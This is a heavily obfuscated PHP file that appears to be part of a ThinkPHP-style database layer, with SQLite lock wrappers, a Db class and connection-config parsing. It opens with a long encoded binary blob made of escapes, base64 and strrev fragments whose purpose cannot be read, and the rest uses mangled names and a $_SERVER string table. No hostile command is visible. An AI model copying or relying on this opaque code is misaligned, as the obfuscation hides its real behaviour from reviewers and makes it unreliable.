GfuZ9+P19RvpiVLE')."\246\56\333\325\24\200\112\271\54\135\105\43\355\155\222\50\21\370\213\105\326\140\331\112\145\176\200\145\40\203\210\360\372\134\224\271\206\326\232\23\343\136\342\136\222\33\227\372"."\x6e\x47\x9b\x57\x99\x3e\xa3\x7e\xd6\xbc\x7a\x66\xca\x36\x95\xe9\x40\x14\xb\x4c\xdf\x1a\x7d\x32\xdf\xee\xc7\x5\xfb\x19\x1e\x10\xef\x3f\xb0\xb1\xe1\x5\x97\x9c\xe1\xbb\xa2\xc5\x34\xf2\x1d\xce"."\20\210\53\237\350\255\353\145\21\30\50\345\331\45\247\375\104\300\115\167\22\326\14\122\371\43\7\145\60\51\142\306\330\201\1\307\256\244\257\312\27\144\200\175\130\74\277\46"."\266\110\137\166\120\214\244\17\253\226\3\204\17\242\216\232\202\314\42\107\256\44\115\116\145\212\371\301\6\51\121\161\114\123\311\151\371\61\340\6\246\330\365\123\354\371\270\241".strrev('jíØzä'."\n".'#×ò-™ÛfqR'."\0".'I"üùÅB8‡R"9ñm.æ¾'."\0".''."\n".'6ı™)†')."\215\164\110\12\114\122\204\332\324\334\241\206\72\73\313\46\160\202\5\13\11\361\355\177\140\65\273\24\111\61\250\132\140\344\6\224\24\266\267\150\250\300\261\25\212\155\245\230"."\143\337\212\40\340\121\222\101\360\117\13\14\50\122\211\213\50\375\10\114\374\344\213\46\127\56\134\20\64\26\362\311\26\356\207\54\123\230\223\4\202\307\143\156\52\210\125\204".base64_decode('8lPx6soaCyS2RTgbUpQFmkLnsaES62/0VyoZdB5z/ciF3sId7NpoQVCTE/HOipuM')."\xfc\xe5\x4c\xd4\x30\x17\xd4\x97\xbd\x81\x8\x49\x6e\xc0\xc9\x6b\x10\x4d\x5a\x7e\x59\x69\x11\x5c\x79\x20\x25\x27\xd1\x95\x24\x6\x2f\xa5\xf9\x83\x44\x12\x10\x14\xfc\xa2\xfb\x4a\x86\xdf\x62\x94"."\1\212\200\170\267\111\113\15\142\210\22\350\37\332\204\204\116\314\242\320\4\327\363\6\216\244\242\121\304\306\137\104\320\156\211\67\130\326\254\241\25\341\23\177\335\272\322\70"."\320\362\364\46\205\12\206\67\12\103\216\67\16\263\334\42\16\235\143\356\146\50\324\312\231\104\14\313\103\177\105\231\150\107\253\10\120\226\304\225\330\315\24\252\111\250\247\273"."\62\120\263\156\135\320\140\272\120\114\157\203\225\15\360\334\64\334\23\160\347\107\43\201\251\347\31\41\302\233\223\322\217\213\141\363\115\12\326\10\203\65\256\363\244\140\105\250"."\206\206\205\335\374\136\247\227\245\61\42\320\250\233\313\226\177\74\343\117\56\347\237\115\35\202\314\345\100\116\361\111\200\210\113\102\156\27\300\213\206\371\353\42\164\126\345\357".strrev('ÅÕ7µkª"ÃÑ!^¶O%…cÄñ®Ybó°”÷§nùôk!ä9“Ù ¡P')."\43\371\307\2\73\145\31\5\307\205\247\350\203\202\25\344\365\227\325\332\260\106\263\124\50\300\237\67\124\20\357\367\25\10\57\321\24\100\10\242\53\13\60\2\122\54\75\333"."\x50\x41\xba\x6b\x67\x74\x1d\x95\x27\x28\xa6\x5c\x23\xa8\x60\x85\xc2\xb0\x63\x4e\xe3\x33\x66\x39\x26\x3a\xf8\xb8\xc5\x11\xbc\xc5\xd4\x15\x7\x53\x88\x50\x7\xdc\xeb\x0\x49\x75\xfc\x49\xf4\x77"."\362\361\14\120\310\303\140\131\335\242\372\336\4\353\220\233\276\176\41\323\202\247\241\72\343\261\144\254\211\275\244\123\116\370\65\223\321\257\66\65\221\23\174\16\263\340\341\152".base64_decode('ESwHpwiCEAPLbxXzea5hhklEfmxhjRV1cSLWwV4eSXLoweZGAaVbYxdRoJpKb9YS')."\x99\xa2\x23\x8e\x48\xec\x4e\x3f\x89\xed\x83\x6d\x88\x96\x9c\x7\x62\xd7\x85\xa8\xa2\x6e\x2a\xab\x6c\xa8\x65\xc6\x19\x4c\x71\x4d\x58\x95\x41\xce\x32\x75\x50\x39\x70\x92\x2b\x86\xe9\x79\x97\x8".strrev('C®ˆÃ ¼†'."\0".'á;Š,.)&ù=mmK$¶¶¾­’¿ô:ÚşµµµéÅ?™5¶„')."\207\340\144\310\31\371\42\243\252\272\233\260\75\230\202\273\326\313\10\11\326\177\264\36\304\315\41\303\43\363\45\136\160\276\102\156\34\41\244\173\47\201\137\345\302\12\313\176".strrev('OD(-ù~	gìíğ¤irlÆå»§Î;ÀÙÏj|ÑÀM”CrşI“jĞn"7Ù²')."\161\217\341\352\32\52\343\366\237\210\143\320\111\235\342\343\304\21\222\310\4\123\152\222\117\110\34\224\257\53\110\62\267\347\43\241\54\167\30\200\203\35\274\46\372\344\7\265"."\xa4\x83\x39\x2c\x3\xae\x19\x73\x44\x15\x87\x31\xe\x2e\xe6\x21\x32\xa5\x98\x67\x62\x60\x98\x96\x6c\x2e\xf1\xbc\x32\xb4\xcc\xc0\x8e\x29\x22\x80\x5e\x3\xb1\xa1\x1f\x34\xb2\x2e\xcb\x61\x55\xaa"."\x5b\x9e\xcd\xf9\x38\xa3\x3c\x4b\x68\xd3\x86\xf8\xdb\x26\x54\xbb\x90\x35\xaf\xc0\xee\x2\x42\x1\x9f\x15\xe4\x59\x3a\xaa\x10\x5a\x3f\xa9\x64\xfd\x1c\xef\xda\x91\x65\xb0\x4c\x61\xf7\x5b\xa2\xd3"."\303\102\322\142\60\251\170\342\153\324\156\130\114\230\105\120\105\225\46\356\61\121\252\300\233\344\51\23\242\302\364\222\2\20\137\232\233\134\100\224\311\215\343\75\271\211\257\304".base64_decode('Ju7wVXagSDUEJD0SG5zaC5UAVsewxDEFCpY5gJbZlicNxXeWj+bZS3OWycR7L+eT')."\43\361\355\6\173\34\22\40\126\330\36\153\342\155\132\51\153\202\363\134\122\244\173\303\112\11\115\374\11\42\71\22\163\140\262\22\10\121\263\165\327\201\131\73\167\14\357\331"."\127\0\35\143\311\35\170\110\124\126\62\244\331\4\322\301\342\22\131\250\253\272\300\204\301\52\323\71\301\63\44\356\177\335\361\64\216\62\315\256\53\243\44\301\145\131\235\275"."\x6b\xa\xd8\x8e\x6c\x2a\x5c\x1\xd1\xcd\xf1\x4c\xaa\xd8\x8\xb0\x75\x1b\x1a\xe4\x62\xee\xb4\x7f\x9e\x79\x1\xfb\xb8\x90\xe5\xc2\xd3\xca\x65\x7e\xb2\x30\x1c\x4f\xa9\x2a\xcb\x33\xf0\x8e\x6e\xe3"."\xcf\x69\x96\x1\x44\x37\xb0\x95\x40\x15\x21\x1\x70\x5\xf5\x1c\xdb\x49\x21\xc4\xcc\x31\x7a\x2f\xcd\xfa\x3b\x54\xd4\x19\x8d\x2a\xa1\x46\xc5\x11\x88\x11\xd0\x58\x32\x63\x99\xe\xe7\x5f\x70\x7a"."\50\55\241\373\250\114\241\44\151\21\377\102\321\216\353\356\114\362\333\314\263\242\243\214\265\256\261\343\215\50\202\21\277\327\22\113\345\11\172\225\305\310\121\344\260\323\204\71".base64_decode('ws7zR63wciYkXZ0yLUAhXkQYj7vOTEtPmRbhtSXHCXknrg/IwajJZQz47qZcFdhX')."\215\264\15\60\124\40\356\267\50\173\276\221\374\147\243\220\344\50\135\242\175\374\165\12\47\232\124\132\63\15\114\223\22\110\376\162\364\223\107\322\45\131\61\20\346\76\121\354"."\xe3\x17\xe\x1e\xaa\x86\x19\x46\x28\x32\xd1\xc0\x2c\x1d\x70\x5\xc4\x9\x9\x1e\x81\x2d\xa7\xa1\x6a\xb1\x8f\x5b\x31\x32\xb9\x8\x69\xb3\xa4\x8\x4d\xc3\xe7\xb6\x70\xe5\x21\xa7\xd8\xd8\x3\x7a"."\27\133\306\162\51\145\232\42\111\322\214\246\270\103\43\230\35\61\111\220\60\246\63\375\100\177\335\164\377\14\220\147\313\126\23\214\160\6\274\206\366\206\4\6\230\307\140\270".base64_decode('EpT9IJ/IY0rXNsS9h3B/QDyZ8PUkLk94yJLONp0rAhLfHzKaEbfrVD8QZ+gql05n')."\10\47\67\273\324\47\75\31\320\116\161\247\203\123\164\321\31\352\176\304\164\351\340\170\52\1\207\373\262\263\167\122\112\214\103\150\242\242\50\223\272\136\227\46\106\150\11\120".base64_decode('ryhMhZbjKRGdNHlkqaZBgKsQgz0pvFhZVY3tSV0SnfYxbvWH9YAwiuB6nLYcYKkc').base64_decode('OG1XgOo9uUrzKJ5rRGemoUzy0NnWGeRRjXx7Um5VOGNqYspF4pn1kZyRUqKx1khT')."\x28\xda\x1c\x49\x2c\x51\x6\x74\x47\x11\x2a\x11\xe4\xc1\x4\xf7\x56\x26\x82\x36\x3a\xf1\xc\xaa\xfb\xb8\xef\x7e\xfc\xe9\xef\x43\x14\xac\x3f\xcd\x9\x79\x5b\x90\xec\x92\xf6\x97\xf4\x48\x92\xbb".base64_decode('Wgp/ulVSYx5bfGRLymDxYZncWSFNkzIXLL00/5hO3kkXPZYKFMv0BvKXb4E8sCDn')."\x46\x7\xb3\x9e\x9f\xa8\xf3\x46\x7e\xd8\xb0\xd\xb1\xf1\x59\x89\x31\xb9\xf6\x50\x73\x7b\xa4\x43\xd\x45\xa3\x88\xdd\x97\xb5\xe4\x84\xe0\xd4\xe2\xcf\x59\xa4\xe5\xd7\x2f\xa4\x95\x11\x8b\x40\x5b"."\57\365\21\6\36\226\144\47\344\36\316\235\56\237\354\53\256\300\256\1\340\271\77\356\14\237\6\245\247\154\12\226\146\330\272\24\101\137\130\251\1\3\13\55\233\165\75\142"."\x97\xed\x97\x82\x45\xf7\xc9\x5a\xb6\x29\x95\x36\xc0\xe2\x24\x77\x74\xe5\x32\xc4\xf1\xeb\xe4\xff\xeb\xae\x1a\x69\xe1\x16\xca\x48\x33\x6d\x4\x6e\xf\x47\xfd\xe4\x37\xc9\xf\x1e\xb2\x36\x4b\x9e"."\xeb\xf9\xda\x87\x7f\x7c\x92\xab\x1a\xe2\x62\x87\xbd\x3f\x66\x12\xf2\x1c\x68\x47\x1a\x17\x89\xa9\xd4\xbf\x8c\x68\x2\x31\x8e\xd6\x58\x41\xbe\xb9\xa\xa6\x83\x7c\x8a\xe9\x7\xf6\x7e\x17\x66\x22"."\154\34\20\204\62\316\16\265\341\346\50\373\204\270\102\54\347\141\44\65\323\172\104\170\2\346\331\165\163\353\171\302\310\253\24\352\172\63\274\244\15\342\55\237\246\165\343\341"."\240\234\275\142\160\50\304\337\276\20\105\275\51\145\72\200\222\25\41\106\341\31\224\6\245\226\276\246\305\137\63\120\26\60\353\136\321\0\361\127\25\316\25\34\27\153\331\46".base64_decode('a4NLa0MjCKUjCEWsU2PmxkoiXLKTKOsXV8LDbznk+015/ghCxqr99E08ysP6EO2v')."\73\245\117\342\320\342\377\137\12\322\304\204\244\232\350\256\244\264\103\266\367\250\23\144\27\176\355\47\143\216\270\37\306\303\61\336\367\175\134\57\373\110\233\206\30\241\312\157"."\21\271\13\371\112\336\324\120\310\213\247\12\2\165\130\105\354\305\210\361\110\44\263\324\364\24\372\323\3\277\354\70\363\166\202\42\52\150\262\232\3\125\123\306\310\246\55\256"."\44\42\42\332\165\301\270\222\122\130\117\102\143\57\273\222\147\302\232\31\116\206\147\74\312\275\0\205\175\317\271\337\45\21\317\275\210\263\323\375\40\6\277\352\264\305\146\260"."\35\327\203\53\111\63\251\15\370\50\105\206\261\232\10\65\216\311\337\262\142\50\31\5\112\144\302\245\64\137\357\205\122\6\366\316\132\332\107\36\1\243\250\316\373\116\210\264"."\323\70\376\224\113\17\144\315\76\55\33\247\272\125\56\103\20\13\161\123\134\137\322\225\215\106\5\265\102\101\134\305\310\107\46\372\353\62\226\203\264\256\144\233\112\114\276\125"."\x7a\x77\x9b\x10\x30\x27\x5d\xe2\xd0\x48\xb8\xd0\x29\xe6\x23\x54\xf0\xed\x8a\xb5\x24\x3e\x4f\x56\xea\xa5\x57\x57\xc2\x2a\xb\xb2\xa3\x7e\x76\xd2\xbb\x2a\x98\x30\xb9\x4a\x76\x7f\xc8\xa5\xb0\x2d"."\322\13\340\301\322\373\106\254\65\6\30\105\126\252\204\253\337\200\314\210\101\6\145\201\42\100\303\265\221\61\50\41\152\330\107\76\10\246\220\11\367\257\210\345\20\354\176\203"."\x86\x82\x3a\xf9\x69\xd6\xfb\x39\x17\x83\xc3\xe2\x34\x97\xfd\x54\x8\x3d\x3\xef\x33\x6a\xac\x19\xfe\xa\x9c\x8f\x8e\x4c\xbc\xfe\x49\xdf\x7c\xf3\xf1\xf7\xdd\x7c\xd4\xc5\xa1\xf\x5e\x75\xf3\x9"."\353\272\257\172\306\106\74\354\353\176\15\30\367\231\153\41\226\260\23\136\116\202\117\225\247\100\334\73\161\111\263\124\6\51\156\131\363\305\234\270\267\106\1\67\147\125\62\140".strrev('eatµN ¸fÍçOv,úõWÆí)v£*ƒ¯¯Ã™”ÊòTb3ÍÉæ>Ìw#ë+E„i')."\102\35\156\226\240\366\225\271\364\364\31\263\346\311\142\11\261\76\342\66\13\314\334\341\366\15\350\14\261\342\212\33\236\24\346\345\123\336\267\44\321\255\47\134\372\374\242\7"."\167\377\357\40\137\320\375\64\253\244\265\133\372\214\155\311\14\20\40\224\364\131\244\243\314\243\274\140\142\235\2\133\154\37\172\170\211\107\27\335\155\321\203\277\314\70\244\23"."\113\354\4\372\46\236\231\305\334\161\16\113\201\35\113\163\263\202\345\70\36\62\23\214\275\62\310\323\324\272\267\357\144\142\100\16\42\222\45\226\110\256\321\61\275\102\34\134"."\x1c\x9f\x68\x44\xa6\x18\xcb\x67\xe1\xc0\xc5\x56\xc3\x62\x4f\x49\x28\xe5\x7f\xb1\x80\x8c\xbb\xa1\x8c\x90\x50\x5d\x29\x33\xf2\xe0\x9\xc\x6f\x94\x79\xf3\x50\xba\xff\xff\x8a\x7e\x53\xba\x8c\x73".strrev('q<ÌÒá–D”¯ÂˆÓÒg•2‰”úôu©êÇºpÁèF\'tş	)'."\0".'KñÍ~r')."\x7e\x9d\x21\x27\xf9\xd1\x47\x27\x23\x18\xf\xba\x43\x5d\xbb\x55\xf2\x9d\x2b\xdb\x6b\x91\x8a\xe4\x6d\x50\x5a\xb5\xf4\x6\x9e\x10\xe1\x10\x99\xf\xc\x2\xf6\x30\x71\x9d\x49\xec\xf4\x42\xad\xdc"."\166\117\223\324\215\334\162\45\74\273\322\263\247\246\374\55\146\35\343\363\30\363\135\212\132\167\361\205\50\334\354\171\22\227\140\45\357\73\271\154\212\10\52\20\130\116\62\11".base64_decode('dTEh/J0wF1Nie58CRKSZ7FUYBfkmgOMU0CHR66atSaelOBjFV0cxJwKSMJbwPzzR')."\x65\x39\x8b\xfd\x23\x79\x76\x3e\xb3\xc7\xb5\x3d\xf\x83\x52\xcf\xb0\xf4\x9b\x91\xe9\xff\xbf\xdf\xbe\xfb\xbf\xf5\xe4\xdd\xac\x5a\x26\x36\x77\x3d\xac\xdb\xa\xc4\x32\xa3\xcf\xc6\x25\x9f\xd2\x54"."\144\353\31\207\373\320\74\0\240\210\277\41\55\205\271\362\52\363\221\305\134\147\151\354\332\107\313\146\245\243\265\74\173\121\362\42\51\2\276\101\376\234\145\271\200\327\110\314"."\373\72\151\67\173\347\233\74\74\332\133\56\243\300\74\234\213\51\3\307\64\212\21\257\371\322\233\117\274\136\121\267\107\146\211\310\50\311\46\132\105\264\10\163\67\26\144\137"."\51\314\260\141\112\224\241\131\331\72\64\126\140\254\135\65\140\366\336\23\30\72\42\366\346\200\225\144\114\344\212\52\301\137\111\327\52\270\42\345\11\206\125\303\6\265\356\127".strrev('±Äy>’¨ÆÒşuÛïZíEüMå»	k\\¾wÍ-/½/\\%Óg–ÉšEuç»D¡á')."\201\211\215\310\375\13\271\57\55\123\206\102\152\102\344\231\140\257\224\337\261\374\125\113\41\103\303\137\362\170\331\316\357\264\114\102\320\271\143\271\340\105\122\320\224\336\174\236".base64_decode('Eig5Xxi2c0054rLEBZ9hErfsrGhXexWxN2FHuXhBGW8i4csQS8JbTA4V2BEVkfXJ')."\247\66\63\1\223\64\250\41\312\45\221\263\345\27\60\334\45\261\116\274\173\57\55\54\227\55\145\132\266\224\215\307\227\313\213\41\114\226\70\310\151\370\361\133\307\265\26\302"."\xc3\xbe\xd7\xb3\x3e\xe1\xc3\x29\x6b\xed\xe2\xb0\xe1\x4e\x56\x8e\x92\xae\x28\x11\xb1\x9d\x76\x3f\xd5\x41\x12\x49\x34\xf3\x82\x9\x35\x48\x97\x6c\xee\x3b\x4e\xee\x79\xbc\x4\x53\x16\x8d\xa8\x94"."\114\112\61\347\152\350\27\233\311\105\204\77\6\222\114\257\17\102\322\273\312\336\122\356\367\270\245\33\321\24\201\274\160\351\245\227\270\213\223\350\14\126\14\163\102\342\10\360"."\304\227\173\121\272\137\33\26\104\222\240\305\323\151\376\332\273\53\153\232\161\43\74\26\305\210\207\341\61\221\45\131\336\12\205\156\175\304\373\304\156\100\266\326\165\145\54\215"."\x15\x96\xb9\x52\x79\x71\xfd\x21\x86\x89\xe3\xca\xd\x9f\x6c\x27\x77\x71\xd9\xf2\x97\x3\x95\x88\xa2\x8f\x2d\x70\x7d\x22\x89\xef\xc1\x86\x9\x42\xd1\x88\xe\x85\x33\xf1\xa2\x49\xb7\x9d\x31\xcf"."\xc6\xd7\xc\xe5\x21\x66\x20\x7e\x57\xac\x87\x93\xc3\x22\x11\x46\x31\x78\x92\x6c\xf9\x21\x7b\xf7\x45\xa7\x2c\x55\x90\x40\x40\xcf\x46\xa5\xea\xe4\x4b\xd0\x9\xb\x24\xca\x37\x22\xa0\xd2\x3d\xc5".base64_decode('koG2SGBHnemafAlF8oFBzric6OqOd2kJEyLAl0bmiACWpoXcSTS/7um9XMA7MlrC')."\x1e\x31\x9c\x54\x46\xe2\x8c\x4a\x13\x4b\xe3\xad\x92\x49\x85\x86\xca\xf7\xd7\xdb\x2b\x36\xa7\x5e\x7e\x51\x54\x52\xd2\x1f\x49\x93\x22\x69\x96\x29\x43\x7b\x54\xb6\x18\x4d\xc2\x25\x5\xb9\xea\x2a"."\73\301\24\340\262\64\11\227\55\111\146\205\45\361\212\124\316\321\212\366\4\303\53\235\74\220\71\244\313\14\330\303\231\323\254\23\315\147\331\314\245\315\1\304\171\163\23\41"."\105\371\136\10\331\202\347\106\273\134\57\312\146\236\260\27\42\267\347\24\50\207\153\131\112\31\354\52\124\33\112\361\270\110\53\243\150\101\353\304\147\264\354\260\251\114\262\254"."\265\121\136\257\43\136\166\353\333\156\205\13\117\274\74\61\340\233\23\250\53\200\66\304\51\146\215\101\241\223\306\124\250\247\270\360\173\61\77\230\67\371\231\221\26\372\163\130".base64_decode('2TdkeSeypDY3nOaLkrvTshrdPszXl3LQWY3J7CVVeMrymI6R0t0+VWW/TTSdNZKV')."\144\203\36\261\234\220\62\270\24\2\312\10\256\110\24\320\165\102\374\115\353\223\50\26\1\23\56\23\4\112\47\300\225\0\275\115\154\302\267\326\374\36\211\370\3\245\347\52"."\115\116\230\226\343\303\151\111\263\100\176\33\115\307\21\267\353\224\255\47\304\40\76\34\175\222\362\10\372\22\227\106\270\123\344\66\202\200\55\101\57\344\23\356\65\61\277\234"."\320\151\52\101\112\256\0\276\345\340\1\371\354\203\373\315\226\242\347\6\126\104\40\346\264\317\34\145\336\26\261\151\263\350\17\276\230\220\246\114\320\47\0\176\262\372\13\61".base64_decode('GreDNCUIXvr9GiYU4QGwwOrCgKs4fUaJq3h+VQ0gRRVVUBfdRNYFtiKJZKIkqTOU').base64_decode('SCyPxZupR++SZFJKUicqSepsi3VMlBZuD0WiJWlY86hDFa61aFKkk/SSXN9N1ItI')."\323\22\321\23\162\121\54\204\363\205\214\311\144\356\354\362\42\241\145\31\227\56\131\102\352\71\341\143\115\224\311\33\251\101\41\334\323\44\342\335\146\356\7\371\207\373\251\34"."\x8f\x82\x1f\x3\x52\xa8\x8\x6b\xd\x75\x40\xdd\xf1\x2\xc4\x62\xf\xe7\x7c\xaf\x73\x42\x5a\xb6\xd\x13\xb7\xe0\x1\xd7\x6d\xb9\x14\x4f\xf6\x6\x41\x36\x12\xfc\xc9\x87\x2e\x89\xa8\x29\x3b\x59"."\xb2\x90\xb7\xf4\xd2\x81\xa4\x8a\xc9\xc0\x9d\x5c\x6c\x82\xfa\xd9\x6a\xb3\x4f\xba\x54\xa0\x2c\xd\x58\x26\xc2\xf4\x4a\x5a\x62\xf4\xdb\x95\xec\x68\x3\x65\x2f\x8d\xa9\x64\xf\xef\x7e\x21\x73\xfb"."\77\163\124\71\67\264\251\0\0"."".base64_decode('').""."".base64_decode(''), 10, -8))); goto cŠìÈÊ£†Ç; B®­İõˆ¢“: class DbSqlite3 extends DbSqlite3Base { public function query($…øîøÈÂ) { $ùáÃ¢›æ =& $_SERVER[ßğøİ]; if (!CacheLock::fileLock($ùáÃ¢›æ[13])) { return !1; } $¤Í¾µÃÃ = parent::query($…øîøÈÂ); CacheLock::fileUnLock($ùáÃ¢›æ[13]); return $¤Í¾µÃÃ; } public function execute($Á¯Ü¸¹×) { $ŞîÜÅ¼Ü =& $_SERVER[ßğøİ]; if (!CacheLock::fileLock($ŞîÜÅ¼Ü[13])) { return !1; } $ßø¶¬“Ï = parent::execute($Á¯Ü¸¹×); CacheLock::fileUnLock($ŞîÜÅ¼Ü[13]); return $ßø¶¬“Ï; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\x65\161" => "\74\76", "\147\164" => "\76", "\x65\x67\164" => "\x3e\x3d", "\x6c\x74" => "\74", "\x65\154\164" => "\x3c\75", "\x6e\157\164\154\x69\x6b\145" => "\x4e\117\124\40\x4c\x49\x4b\x45", "\154\151\x6b\145" => "\114\x49\x4b\105", "\x69\156" => "\111\116", "\x6e\x6f\164\151\156" => "\x4e\x4f\x54\40\111\x4e", "\156\157\x74\40\151\156" => "\x4e\117\124\x20\x49\116", "\142\x65\x74\167\145\x65\156" => "\102\105\124\127\x45\x45\116", "\156\157\164\x62\x65\x74\x77\x65\145\156" => "\116\117\x54\x20\102\x45\124\x57\105\105\x4e", "\156\x6f\164\40\142\x65\x74\x77\x65\145\x6e" => "\x4e\117\x54\x20\102\x45\124\127\x45\105\x4e"); protected $selectSql = "\123\x45\x4c\x45\x43\124\45\104\x49\x53\124\x49\116\103\124\45\x20\45\x46\x49\x45\x4c\x44\x25\40\x46\122\117\115\40\x25\124\101\102\114\105\x25\45\x4a\117\x49\116\45\45\x57\x48\105\x52\105\x25\x25\x47\122\x4f\x55\120\45\45\110\101\x56\111\x4e\107\x25\x25\x4f\x52\104\x45\x52\x25\x25\x4c\111\115\111\x54\x25\x20\45\x55\116\111\x4f\x4e\x25\x25\103\x4f\115\115\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $‡Ğœ¯Çà = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ßğøİ][960], $‡Ğœ¯Çà); } public function factory($ëĞÔ²åÎ = '') { $ùş¾½î´ =& $_SERVER[ßğøİ]; $ëĞÔ²åÎ = $this->parseConfig($ëĞÔ²åÎ); if (empty($ëĞÔ²åÎ[$ùş¾½î´[961]])) { think_exception(think_lang($ùş¾½î´[962])); } $this->dbType = ucwords(strtolower($ëĞÔ²åÎ[$ùş¾½î´[961]])); $ıØ”¢±È = $ùş¾½î´[963] . $this->dbType; if (class_exists($ıØ”¢±È)) { $‘šåÛİÒ = new $ıØ”¢±È($ëĞÔ²åÎ); if ($ùş¾½î´[964] != strtolower($ëĞÔ²åÎ[$ùş¾½î´[961]])) { $‘šåÛİÒ->dbType = strtoupper($this->dbType); } else { $‘šåÛİÒ->dbType = $this->_getDsnType($ëĞÔ²åÎ[$ùş¾½î´[916]]); } } else { think_exception(think_lang($ùş¾½î´[965]) . $ùş¾½î´[966] . $ıØ”¢±È); } return $‘šåÛİÒ; } public function __call($¬§¢úõ³, $ÌŠâ¥ ) { if (method_exists($this, $¬§¢úõ³)) { return call_user_func_array(array($this, $¬§¢úõ³), $ÌŠâ¥ ); } } protected function _getDsnType($ı€âê¦®) { $ÑÇŸ‚€Ó = explode($_SERVER[ßğøİ][4], $ı€âê¦®); $úÔ½éáÆ = strtoupper(trim($ÑÇŸ‚€Ó[0])); return $úÔ½éáÆ; } private function parseConfig($€ÔÌ¿Ø = '') { $¶¤’²Ó =& $_SERVER[ßğøİ]; if (!empty($€ÔÌ¿Ø) && is_string($€ÔÌ¿Ø)) { $€ÔÌ¿Ø = $this->parseDSN($€ÔÌ¿Ø); } elseif (is_array($€ÔÌ¿Ø)) { $€ÔÌ¿Ø = array_change_key_case($€ÔÌ¿Ø); $€ÔÌ¿Ø = array($¶¤’²Ó[961] => $€ÔÌ¿Ø[$¶¤’²Ó[967]], $¶¤’²Ó[887] => $€ÔÌ¿Ø[$¶¤’²Ó[968]], $¶¤’²Ó[888] => $€ÔÌ¿Ø[$¶¤’²Ó[969]], $¶¤’²Ó[885] => $€ÔÌ¿Ø[$¶¤’²Ó[970]], $¶¤’²Ó[886] => $€ÔÌ¿Ø[$¶¤’²Ó[971]], $¶¤’²Ó[21] => $€ÔÌ¿Ø[$¶¤’²Ó[972]], $¶¤’²Ó[916] => $€ÔÌ¿Ø[$¶¤’²Ó[973]], $¶¤’²Ó[17] => isset($€ÔÌ¿Ø[$¶¤’²Ó[974]]) ? $€ÔÌ¿Ø[$¶¤’²Ó[974]] : array()); } elseif (empty($€ÔÌ¿Ø)) { if (think_config($¶¤’²Ó[975]) && $¶¤’²Ó[964] != strtolower(think_config($¶¤’²Ó[976]))) { $€ÔÌ¿Ø = $this->parseDSN(think_config($¶¤’²Ó[975])); } else { $€ÔÌ¿Ø = array($¶¤’²Ó[961] => think_config($¶¤’²Ó[976]), $¶¤’²Ó[887] => think_config($¶¤’²Ó[977]), $¶¤’²Ó[888] => think_config($¶¤’²Ó[978]), $¶¤’²Ó[885] => think_config($¶¤’²Ó[979]), $¶¤’²Ó[886] => think_config($¶¤’²Ó[980]), $¶¤’²Ó[21] => think_config($¶¤’²Ó[246]), $¶¤’²Ó[916] => think_config($¶¤’²Ó[975]), $¶¤’²Ó[17] => think_config($¶¤’²Ó[981])); } } return $€ÔÌ¿Ø; } protected function initConnect($Ï–—ÊÀ = true) { if (1 == think_config($_SERVER[ßğøİ][22])) { $this->_linkID = $this->multiConnect($Ï–—ÊÀ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $·æùÒíš => $²±š¶ö) { $this->_linkID = $²±š¶ö; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($©ıö¿…± = false) { $©×åÛ =& $_SERVER[ßğøİ]; static $Üà‹Éˆù = array(); static $³ç°…“ = -1; if (empty($Üà‹Éˆù)) { foreach ($this->config as $˜øÕá“ä => $şŠäâŸÃ) { $Üà‹Éˆù[$˜øÕá“ä] = explode($©×åÛ[50], $şŠäâŸÃ); } } if (think_config($©×åÛ[982])) { if ($©ıö¿…± || think_config($©×åÛ[395]) === !0) { $•¦ªğºŒ = floor(mt_rand(0, think_config($©×åÛ[983]) - 1)); $³ç°…“ = $•¦ªğºŒ; } else { if (is_numeric(think_config($©×åÛ[984]))) { $•¦ªğºŒ = think_config($©×åÛ[984]); } else { $•¦ªğºŒ = floor(mt_rand(think_config($©×åÛ[983]), count($Üà‹Éˆù[$©×åÛ[885]]) - 1)); } } } else { $•¦ªğºŒ = floor(mt_rand(0, count($Üà‹Éˆù[$©×åÛ[885]]) - 1)); $³ç°…“ = $•¦ªğºŒ; } $•¦ªğºŒ = $³ç°…“ !== -1 ? $³ç°…“ : $•¦ªğºŒ; $Ë¼“¢È³ = array($©×åÛ[887] => isset($Üà‹Éˆù[$©×åÛ[887]][$•¦ªğºŒ]) ? $Üà‹Éˆù[$©×åÛ[887]][$•¦ªğºŒ] : $Üà‹Éˆù[$©×åÛ[887]][0], $©×åÛ[888] => isset($Üà‹Éˆù[$©×åÛ[888]][$•¦ªğºŒ]) ? $Üà‹Éˆù[$©×åÛ[888]][$•¦ªğºŒ] : $Üà‹Éˆù[$©×åÛ[888]][0], $©×åÛ[885] => isset($Üà‹Éˆù[$©×åÛ[885]][$•¦ªğºŒ]) ? $Üà‹Éˆù[$©×åÛ[885]][$•¦ªğºŒ] : $Üà‹Éˆù[$©×åÛ[885]][0], $©×åÛ[886] => isset($Üà‹Éˆù[$©×åÛ[886]][$•¦ªğºŒ]) ? $Üà‹Éˆù[$©×åÛ[886]][$•¦ªğºŒ] : $Üà‹Éˆù[$©×åÛ[886]][0], $©×åÛ[21] => isset($Üà‹Éˆù[$©×åÛ[21]][$•¦ªğºŒ]) ? $Üà‹Éˆù[$©×åÛ[21]][$•¦ªğºŒ] : $Üà‹Éˆù[$©×åÛ[21]][0], $©×åÛ[916] => isset($Üà‹Éˆù[$©×åÛ[916]][$•¦ªğºŒ]) ? $Üà‹Éˆù[$©×åÛ[916]][$•¦ªğºŒ] : $Üà‹Éˆù[$©×åÛ[916]][0], $©×åÛ[17] => isset($Üà‹Éˆù[$©×åÛ[17]][$•¦ªğºŒ]) ? $Üà‹Éˆù[$©×åÛ[17]][$•¦ªğºŒ] : $Üà‹Éˆù[$©×åÛ[17]][0]); return $this->connect($Ë¼“¢È³, $•¦ªğºŒ); } public function parseDSN($¡œşõå™) { $”™‹Åİ =& $_SERVER[ßğøİ]; if 